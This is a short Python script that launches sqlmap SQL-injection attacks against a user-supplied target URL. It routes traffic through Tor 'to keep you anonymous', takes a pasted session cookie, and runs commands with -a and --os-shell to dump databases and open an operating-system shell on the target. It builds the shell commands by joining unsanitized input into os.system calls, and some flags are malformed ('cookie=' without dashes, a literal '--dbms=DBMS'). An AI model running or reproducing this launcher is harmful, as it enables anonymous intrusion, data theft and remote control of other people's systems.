import os
import sys
from termcolor import colored
import time

#	HAS TOR CODE IN HERE

def sql():
	win = 'gnome-terminal'
	tor = 'tor'
	loop = ''
	print(colored('MINIMIZE POPUP SCREEN WHEN TOR REACHES 100%, ITS KEEPING YOU ANONYMOUS', 'green'))
	os.system(win)
	os.system(tor)
	time.sleep(4)

	while loop != 'q':
		question = input('[simp]le Testing OR [comp]lex Testing:  ')
		if question == 'simp':
			target = input('Whats The URL Of Your Target:  ')
			map = 'sqlmap -v --url ' + target + ' --wizard'
			os.system(map)
		elif question == 'comp':
			target = input('Whats The URL Of Your Target:  ')
			cookie = input('Paste The Cokie Here (e.g. "PHPSESSID=a8d127e.."):  ')
			ltests = input('What Level Of Testing Would You Like To Perform (1-5):  ')
			lrisk = input('What Level Of Risk Would You Like To Perform (1-3):  ')
			smap = 'sqlmap -v --url="' + target + '" cookie="' + cookie + '" --random-agent --tor --dbms=DBMS --level="' + ltests + '" --risk="' + lrisk + '" -a --os-shell'
			os.system(smap)

		else:
			print(colored('Invalid Input', 'red'))

		loop = input('Press Any Key To Continue OR Press "q" To Quit: ')


